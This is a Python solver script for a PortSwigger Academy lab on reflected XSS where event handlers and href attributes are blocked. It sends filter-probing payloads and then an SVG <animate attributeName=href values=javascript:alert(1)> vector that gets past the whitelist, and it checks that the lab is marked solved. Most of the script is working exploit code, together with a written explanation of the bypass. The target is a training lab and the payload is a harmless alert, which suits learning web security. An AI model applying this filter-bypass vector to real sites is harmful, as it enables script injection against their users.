#!/usr/bin/env python3
"""Automated solver: PortSwigger "Reflected XSS with event handlers and href
attributes blocked" (EXPERT).

Vulnerability
-------------
The blog search reflects the query string unescaped into the results heading:

    <h1>0 search results for '<svg>…</svg>'</h1>

so markup injected into ``?search=`` is parsed by the browser.  A server-side
filter inspects the search term and answers HTTP 400 with a plain-text reason:

    "Tag is not allowed"        <b>, <script>, <img>, …
    "Event is not allowed"      any on*= attribute
    "Attribute is not allowed"  href (and other non-whitelisted attributes)

The whitelist still admits ``svg``, ``a``, ``animate`` and ``text``, which is
enough to build a link whose destination is set at runtime:

    <svg><a><animate attributeName=href values=javascript:alert(1) />
           <text x=20 y=20>Click me</text></a>

``animate`` writes the forbidden ``href`` attribute *after* the filter has run,
so the ``<text>`` becomes a clickable ``javascript:`` link.  The lab's simulated
user only clicks vectors labelled with the word "Click", which is why the text
node reads "Click me".

The lab has no exploit server (``GET /exploit`` -> 404) and no victim-delivery
step: its checker is server-side and flips the status widget as soon as the
crafted search request is served.

What the solver does
--------------------
1. ``GET /`` — verifies the page <title> is this lab, records the authoritative
   ``widgetcontainer-lab-status`` baseline and discovers the search parameter
   name from the live form (nothing hardcoded).
2. Control requests — proves the filter really is active: an event-handler
   payload, an ``href`` payload and a non-whitelisted tag must each return
   HTTP 400 with the exact reason string.  This is the precondition that makes
   the ``animate attributeName=href`` vector necessary.
3. Capability probe — confirms every tag the vector needs (svg, a, animate,
   text) is still whitelisted, so a changed filter fails loudly instead of
   silently sending a useless payload.
4. Exploit request — sends the vector, asserts the response reflects it
   unescaped (raw ``<animate attributeName=href`` and the "Click me" label).
5. Polls ``GET /`` until the widget flips to ``is-solved`` / ``Solved``, then
   reports request count and wall-clock time.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --show-url
    uv run python solve.py --url "<url>" --wait 30 --verbose

Exit codes: 0 verified solved, 1 exploit sent but lab not marked solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import re
import sys
import time
import urllib.parse

import httpx

LAB_TITLE = "reflected xss with event handlers and href attributes blocked"
UA = "Mozilla/5.0 (PortSwigger event-handler/href XSS solver)"

# The vector from the Academy solution: animate rewrites href after the filter
# has already inspected the markup, and the text node satisfies the lab's
# "label your vector with the word Click" requirement.
PAYLOAD = ('<svg><a><animate attributeName=href values=javascript:alert(1) />'
           '<text x=20 y=20>Click me</text></a>')
REQUIRED_TAGS = ("svg", "a", "animate", "text")

TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-solved\b", re.I)
NOTSOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-notsolved\b", re.I)
FORM_RE = re.compile(r"<form[^>]*action=[\"']?/?[\"']?[^>]*>(.*?)</form>", re.S | re.I)
INPUT_NAME_RE = re.compile(r"<input[^>]*\bname=[\"']?([A-Za-z0-9_\-]+)", re.I)
HEADING_RE = re.compile(r"<h1>(.*?)</h1>", re.S | re.I)


def normalize(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", " ", text.lower()).strip()


class Solver:
    def __init__(self, url: str, *, timeout: float, wait: float,
                 verbose: bool) -> None:
        self.base = url.rstrip("/")
        self.timeout = timeout
        self.wait = wait
        self.verbose = verbose
        self.requests = 0
        self.t0 = time.time()
        self.param = "search"
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": UA},
        )

    # -- plumbing ---------------------------------------------------------- #
    def get(self, path: str) -> httpx.Response:
        self.requests += 1
        r = self.client.get(self.base + path)
        if self.verbose:
            print(f"    GET {r.url} -> {r.status_code}", flush=True)
        return r

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)

    # -- state ------------------------------------------------------------- #
    @staticmethod
    def is_solved(html: str) -> bool:
        """Authoritative check: the lab header widget class for solved state."""
        return bool(SOLVED_RE.search(html)) and "<p>Solved</p>" in html

    @staticmethod
    def is_not_solved(html: str) -> bool:
        return bool(NOTSOLVED_RE.search(html)) and "<p>Not solved</p>" in html

    # -- phases ------------------------------------------------------------ #
    def identify(self) -> str:
        r = self.get("/")
        m = TITLE_RE.search(r.text)
        title = re.sub(r"\s+", " ", m.group(1)).strip() if m else "(no title)"
        self.log(f"lab title       : {title} (HTTP {r.status_code})")
        if normalize(LAB_TITLE) not in normalize(title):
            raise SystemExit(
                "error: this does not look like the expected lab "
                f"({LAB_TITLE!r}): {title!r}")
        form = FORM_RE.search(r.text)
        if form:
            names = INPUT_NAME_RE.findall(form.group(1))
            if names:
                self.param = names[0]
        self.log(f"search param    : {self.param!r} (read from the live form)")
        return r.text

    def baseline(self, home_html: str) -> bool:
        solved = self.is_solved(home_html)
        self.log(f"baseline status : {'SOLVED (already)' if solved else 'not solved'}")
        return solved

    def probe(self, term: str) -> tuple[int, str, str]:
        """Send one search term; return (status, body, reflected heading)."""
        r = self.get("/?" + urllib.parse.urlencode({self.param: term}))
        m = HEADING_RE.search(r.text)
        heading = re.sub(r"\s+", " ", m.group(1)).strip() if m else ""
        return r.status_code, r.text, heading

    def control(self) -> None:
        """Prove the three blocks this lab is named for still exist."""
        checks = [
            ("event handler", "<svg onload=alert(1)>", '"Event is not allowed"'),
            ("href attribute", '<a href=javascript:alert(1)>x</a>',
             '"Attribute is not allowed"'),
            ("non-whitelisted tag", "<script>alert(1)</script>",
             '"Tag is not allowed"'),
        ]
        for label, term, needle in checks:
            status, body, _ = self.probe(term)
            ok = status == 400 and needle in body
            self.log(f"control {label:<21}: HTTP {status} {body.strip()[:48]!r}"
                     f" -> {'blocked as expected' if ok else 'UNEXPECTED'}")
            if not ok:
                raise SystemExit(
                    f"error: {label} is not blocked the way this lab requires "
                    f"(HTTP {status}); the vector would need rethinking")

    def tags_allowed(self) -> None:
        """Each tag the vector needs must still pass the whitelist."""
        for tag in REQUIRED_TAGS:
            status, body, _ = self.probe(f"<{tag}>")
            self.log(f"tag {tag:<13}: HTTP {status}"
                     f" {'' if status == 200 else body.strip()[:48]!r}")
            if status != 200:
                raise SystemExit(
                    f"error: <{tag}> is no longer allowed (HTTP {status}); "
                    "the animate/href vector cannot be built")

    def build_url(self) -> str:
        return f"{self.base}/?{urllib.parse.urlencode({self.param: PAYLOAD})}"

    def exploit(self, *, send: bool = True) -> str:
        url = self.build_url()
        if not send:
            return url
        self.requests += 1
        r = self.client.get(url)
        if self.verbose:
            print(f"    GET {r.url} -> {r.status_code}", flush=True)
        if r.status_code != 200:
            raise SystemExit(
                f"error: exploit request returned HTTP {r.status_code}: "
                f"{r.text.strip()[:80]}")
        m = HEADING_RE.search(r.text)
        heading = re.sub(r"\s+", " ", m.group(1)).strip() if m else ""
        self.log(f"reflected h1    : {heading[:160]}")
        if "<animate attributeName=href values=javascript:alert(1) />" not in heading:
            raise SystemExit(
                "error: the animate/href vector did not survive the filter intact")
        if "Click me" not in heading or "<svg>" not in heading:
            raise SystemExit(
                "error: reflected vector is missing its <svg> wrapper or the "
                "'Click' label the simulated user needs")
        self.log("injection       : vector reflected unescaped; clicking "
                 "'Click me' navigates the <a> to javascript:alert(1)")
        return r.text

    def wait_solved(self) -> bool:
        deadline = time.time() + self.wait
        while True:
            r = self.get("/")
            if self.is_solved(r.text):
                return True
            if time.time() >= deadline:
                return False
            time.sleep(1.0)

    # -- driver ------------------------------------------------------------ #
    def run(self, *, show_url: bool = False) -> int:
        home = self.identify()
        already = self.baseline(home)
        self.control()
        self.tags_allowed()
        if show_url:
            print()
            print("crafted URL (open in a browser, then click 'Click me'):")
            print(self.build_url())
            print()
            return 0
        self.exploit()
        solved = self.wait_solved()
        elapsed = time.time() - self.t0

        print()
        print("=" * 66)
        print(f"lab status      : {'SOLVED' if solved else 'NOT SOLVED'}")
        print(f"caused by solver: {'no (was already solved)' if already else ('yes' if solved else 'n/a')}")
        print(f"HTTP requests   : {self.requests}")
        print(f"elapsed         : {elapsed:.1f}s")
        print("=" * 66)
        if solved:
            print("evidence        : lab header widget reports is-solved / 'Solved'; "
                  "the search response reflects <svg><a><animate "
                  "attributeName=href values=javascript:alert(1)> with a 'Click "
                  "me' label, so a click on the text node runs alert(1).")
            return 0
        print("error: the lab did not report solved state; evidence kept above.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger 'Reflected XSS with event handlers "
                    "and href attributes blocked' lab (EXPERT).")
    ap.add_argument("--url", required=True, help="Lab base URL")
    ap.add_argument("--timeout", type=float, default=20.0,
                    help="Per-request timeout in seconds (default 20)")
    ap.add_argument("--wait", type=float, default=15.0,
                    help="Seconds to poll for solved state after the exploit (default 15)")
    ap.add_argument("--show-url", action="store_true",
                    help="Print the crafted URL and exit without sending it")
    ap.add_argument("--verbose", action="store_true", help="Log every request URL")
    args = ap.parse_args()

    if not re.match(r"^https?://[^/\s]+", args.url):
        print(f"error: --url must be an http(s) lab URL, got {args.url!r}",
              file=sys.stderr)
        return 2

    solver = Solver(args.url, timeout=args.timeout, wait=args.wait,
                    verbose=args.verbose)
    try:
        return solver.run(show_url=args.show_url)
    except httpx.HTTPError as e:
        print(f"error: lab unreachable/expired: {e}", file=sys.stderr)
        return 3
    finally:
        solver.client.close()


if __name__ == "__main__":
    sys.exit(main())
